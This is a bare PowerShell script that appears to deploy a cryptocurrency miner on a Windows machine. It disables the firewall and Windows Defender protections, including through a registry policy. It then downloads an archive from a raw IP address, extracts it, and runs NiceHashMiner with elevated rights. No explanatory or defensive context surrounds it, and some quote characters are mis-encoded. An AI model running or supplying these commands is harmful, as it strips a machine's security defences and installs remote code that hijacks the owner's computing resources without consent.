netsh advfirewall set allprofiles state off
Set-MpPreference -DisableRealtimeMonitoring $true
New-ItemProperty -Path �HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender� -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force

Import-Module BitsTransfer
Start-BitsTransfer -Source http://139.180.134.229/Tool.Zip -Destination c:\Tool.Zip
Expand-Archive -Path c:\Tool.Zip -DestinationPath C:\Tool
Start-Process C:\Tool\nhm_windows_1.9.0.23\NiceHashMinerLegacy.exe  runAs
